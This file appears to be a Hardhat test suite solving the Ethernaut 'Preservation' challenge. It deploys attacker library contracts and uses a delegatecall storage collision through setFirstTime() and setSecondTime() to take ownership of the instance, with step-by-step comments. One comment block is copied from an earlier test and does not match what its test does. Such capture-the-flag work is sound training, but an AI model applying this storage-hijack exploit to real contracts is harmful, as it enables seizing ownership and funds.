const { expect } = require("chai");
const { ethers } = require("hardhat");
require("dotenv").config();

describe("Preservation", () => {
  const INSTANCE_ADDRESS = "0x6D14136daAE090B09FeC465470BAc848fa981782";

  let deployer, attacker;
  let preservation, preservationAttackOne, preservationAttackTwo;

  beforeEach(async () => {
    // Setup accounts
    [deployer, attacker] = await ethers.getSigners();

    preservation = await ethers.getContractAt("Preservation", INSTANCE_ADDRESS);

    const PreservationAttackOne = await ethers.getContractFactory("PreservationAttackOne");
    preservationAttackOne = await PreservationAttackOne.deploy();

    const PreservationAttackTwo = await ethers.getContractFactory("PreservationAttackTwo");
    preservationAttackTwo = await PreservationAttackTwo.deploy();
  });

  describe("Preservation Owner", () => {
    it('Returns the Owner', async () => {
      const OWNER = "0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC";
      expect(await preservation.owner()).to.equal(OWNER);
    });
  });

  describe("Preservation Attack", () => {
    it('It Replaces timeZone1Library Address', async () => {
      /**
       * Here is the idea:
       *  1. Deploy our own library contract with different storage layout.
       *  2. Get the address of our newly deployed library contract.
       *  3. Convert that address to a BigInt and then into a string and assign to ADDRESS_TO_NUMBER.
       *  4. Call setFirstTime() passing in our ADDRESS_TO_NUMBER.
       *  5. This should overwrite storage 0 for the original preservation contract with
       *     our new deployed library contract.
       */

      const ADDRESS_TO_NUMBER = (BigInt(preservationAttackOne.address)).toString();

      await (await preservation.connect(attacker).setFirstTime(ADDRESS_TO_NUMBER)).wait();
      expect(await preservation.timeZone1Library()).to.equal(preservationAttackOne.address);
    });

    it('It Replaces timeZone2Library Address', async () => {
      const ADDRESS_ONE_TO_NUMBER = (BigInt(preservationAttackOne.address)).toString();
      await (await preservation.connect(attacker).setFirstTime(ADDRESS_ONE_TO_NUMBER)).wait();

      /**
       * Expanding off of what we did in the test before:
       *  1. Deploy our own 2nd library contract with different storage layout.
       *  2. Get the address of our newly deployed library contract.
       *  3. Convert that address to a BigInt and then into a string and assign to ADDRESS_TO_NUMBER.
       *  4. Call setFirstTime() again passing in our ADDRESS_TO_NUMBER.
       *  5. This should overwrite storage 1 for the original preservation contract with
       *     our new deployed library contract.
       */

      const ADDRESS_TWO_TO_NUMBER = (BigInt(preservationAttackTwo.address)).toString();

      await (await preservation.connect(attacker).setFirstTime(ADDRESS_TWO_TO_NUMBER)).wait();
      expect(await preservation.timeZone2Library()).to.equal(preservationAttackTwo.address);
    });

    it('Replaces the Owner', async () => {
      const ADDRESS_ONE_TO_NUMBER = (BigInt(preservationAttackOne.address)).toString();
      await (await preservation.connect(attacker).setFirstTime(ADDRESS_ONE_TO_NUMBER)).wait();

      const ADDRESS_TWO_TO_NUMBER = (BigInt(preservationAttackTwo.address)).toString();
      await (await preservation.connect(attacker).setFirstTime(ADDRESS_TWO_TO_NUMBER)).wait();

      /**
       * Expanding off of what we did in the test before:
       *  1. Deploy our own 2nd library contract with different storage layout.
       *  2. Get the address of our newly deployed library contract.
       *  3. Convert that address to a BigInt and then into a string and assign to ADDRESS_TO_NUMBER.
       *  4. Call setFirstTime() again passing in our ADDRESS_TO_NUMBER.
       *  5. This should overwrite storage 1 for the original preservation contract with
       *     our new deployed library contract.
       */

      const ATTACKER_ADDRESS_TO_NUMBER = (BigInt(attacker.address)).toString();
      await (await preservation.connect(attacker).setSecondTime(ATTACKER_ADDRESS_TO_NUMBER)).wait();

      expect(await preservation.owner()).to.equal(attacker.address);

      /**
       * Ether's getStorageAt() can be quite helpful to see contract storage!
       */

    });
  });
});
